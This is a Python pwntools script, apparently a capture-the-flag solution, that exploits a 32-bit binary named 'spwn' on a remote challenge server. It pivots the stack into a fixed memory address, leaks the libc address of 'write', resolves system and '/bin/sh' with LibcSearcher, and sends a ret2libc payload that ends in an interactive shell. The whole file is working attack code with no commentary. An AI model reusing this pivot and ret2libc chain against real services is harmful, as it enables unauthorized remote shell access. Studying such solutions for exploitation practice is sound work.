
from pwn import*
from LibcSearcher import*
elf=ELF('./spwn')
#p=process('./spwn')
p=remote('node4.buuoj.cn',27846)
context.log_level='debug'
s_addr=0x804a300
write_plt=elf.plt['write']
write_got=elf.got['write']
start=elf.symbols['_start']
main=elf.symbols['main']

leave_ret=0x8048408

payload1=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.recvuntil(b'name?')
p.sendline(payload1)
payload2=b'a'*24+p32(s_addr-4)+p32(leave_ret)
p.recvuntil(b'say?')
p.sendline(payload2)
write_addr=u32(p.recv(4))


libc=LibcSearcher('write',write_addr)
libcbase=write_addr-libc.dump('write')
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

p.recvuntil(b'name?')
payload3=p32(sys_addr)+p32(0)+p32(bin_sh)
p.sendline(payload3)

p.recvuntil(b'say?')
p.sendline(payload1)

p.interactive()


 